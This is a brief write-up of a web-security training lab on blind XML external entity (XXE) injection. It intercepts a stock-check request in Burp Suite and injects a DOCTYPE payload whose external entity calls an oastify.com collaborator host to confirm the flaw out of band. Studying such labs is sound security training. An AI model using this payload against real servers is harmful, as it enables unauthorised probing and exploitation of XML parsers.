# Lab: Blind XXE with out-of-band interaction #

## Lab Description ##

![image](https://github.com/anandurdas11/Web_Securityy/assets/83402050/f7ebb739-39fe-4572-b3a8-adfb5aa997ea)

> Visit a product page, click "Check stock" and intercept the resulting POST request in Burp Suite

![image](https://github.com/anandurdas11/Web_Securityy/assets/83402050/609db0c6-9e98-4924-abaf-681b60e57851)

> We have intercepted the request now we will add payload

```
  <!DOCTYPE stockCheck [ <!ENTITY xxe SYSTEM "h5nupa9nlvsbsqhwpzzuihxz6qch0do2.oastify.com"> ]>
```
Replace the productId number with a reference to the external entity: &xxe;

> We got some response in collaborator

![image](https://github.com/anandurdas11/Web_Securityy/assets/83402050/5b3e4791-808e-47a6-8936-67afc81beafd)

![image](https://github.com/anandurdas11/Web_Securityy/assets/83402050/22cb23f9-dfd9-4e1a-b143-cc0a526a8f60)
